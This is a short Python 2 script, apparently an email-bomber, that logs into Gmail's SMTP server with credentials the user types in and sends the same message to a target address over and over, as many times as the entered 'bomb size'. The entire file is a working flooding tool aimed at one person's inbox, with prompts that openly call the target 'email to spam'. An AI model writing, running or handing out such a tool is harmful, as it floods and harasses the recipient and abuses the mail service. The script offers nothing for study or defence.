import smtplib
import getpass

gmail_server = "smtp.gmail.com"
port = 587

count = raw_input("Enter bomb size: ")
from_email = raw_input("\nEnter email to spam from: ")
password = getpass.getpass("\nPassword: ")
to_email = raw_input("\nEnter email to spam: ")
email_text = raw_input("\nEmail text: ")
#
server = smtplib.SMTP(gmail_server, port)
server.ehlo()
server.starttls()
server.ehlo()
server.login(from_email,password)
for i in range(int(count)):
	server.sendmail(from_email, to_email, email_text)
server.quit()